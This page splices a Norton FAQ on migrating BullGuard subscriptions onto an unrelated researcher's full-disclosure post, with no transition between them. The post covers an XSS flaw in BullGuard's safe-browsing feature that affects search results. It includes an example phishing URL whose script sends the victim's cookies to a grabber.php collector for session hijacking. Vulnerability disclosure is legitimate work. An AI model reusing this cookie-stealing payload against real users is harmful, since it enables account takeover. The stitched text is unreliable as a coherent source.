Do my devices still have protection from BullGuard?

We migrated your BullGuard subscription to Norton. With this transition, your protection will continue uninterrupted through the duration of your subscription period.

If you are still on BullGuard protection, we recommend that you migrate to Norton at the earliest. For instructions, see [Migrate your BullGuard protection to Norton](https://support.norton.com/sp/landing?docid=v20220926173300913&product=home&version=current&ispid=nortongo&routequeue=nortongo&inid=bullguard-support_support-v20220926173300913).

I heard BullGuard products/services are discontinued. As a current BullGuard customer, what do I need to do?

We migrated your BullGuard subscription to Norton. The migration to Norton is automatic, and your protection continues uninterrupted through the duration of your subscription period.

If you are still on BullGuard protection, we recommend that you migrate to Norton at the earliest.

I still see BullGuard app on my device. How do I migrate to Norton?

While migration to Norton is set to be automatic, it may not happen automatically in some cases.

Bullguard has a safe browsing feature to prevent their users from entering websites that contain malware, phishing or other malicious content. The idea in itself is great, but earlier this year I made discovery about, how this feature can be abused for malicious purposes. I have made multiple attempts at responsible disclosure since I discovered this vulnerability, but it still hasn’t been fixed, so after 4 months of attempted responsible disclosure, I have decided to make full disclosure of the vulnerability

When a user is browsing through google’s search results, they will see an approval or a warning based on their intelligence about the content being served on the domains. However, if a user is scrolling through google.com, it is possible to execute a javascript vector from the results.

As you can see in the picture below, document.domain refers to [www.google.dk,](http://www.google.dk,) which means the javascript is not sandboxed from google.dk

![]()

Javascript executes without any sandboxing from google’s domain

In other words: The vulnerability allows an attacker to perform reflected Cross Site Scripting attacks on Google, Yahoo and Bing’s domains, if the victim uses bullguard. Imagine the following scenario:

1: An attacker inserts a malicious vector to perform session hijacking though a domain that is vulnerable to XSS in a GET parameter

2: The attacker manages to get enough clicks and abuse the SEO of the vulnerable domain to get his attack vector to show up as a result on google, yahoo and bing

3: The attacker sends a phishing link around that shows the malicious javascript in the results, which could look like this as an example <https://www.google.dk/search?hl=da&ei=3L2bW5HJIYfFwQLKo5GYDA&q=site%3Avulndomain.com+inurl%3Aparam%3D><script>document.location%3D'http%3A%2F%2Flocalhost%2FXSS%2Fgrabber.php%3Fc%3D'+%2B+document.cookie<%2Fscript>

or alternatively: The vector gets so much SEO that it executes by itself from certain legitimate keywords!

4: The attacker has performed a succesful session hijacking attack against your google, microsoft or yahoo account!

XSS can be used for much more, but that’s another topic… Google it, if you’re curious.

Obviously, I decided to report the vulnerability to bullguard themselves, but unfortunately, the only available way of contacting them is though their customer service… Better than nothing, and worth a try though! I made a clear description about the issue and asked the customer service to pass the information through to their developers, or other relevant co-workers in their company.

After no patching had been done, I decided to give it a try again 3 months later, and it turned out that the development team had never responded to the customer service, who notified them about the issue. The customer service gave it another try, but nothing happened

Timeline:

16/05/2018: Vulnerability reported for the first time

02/07/2018 and 15/08/2018: Got in touch with bullguard to tell them that they were still vulnerable

14/09/2018: Public disclosure

Protip: Who says this vulnerability only affects bullguard? If your antivirus has a similar feature, try it out and remember to report the vulnerability responsibly to the vendor, if it’s vulnerable
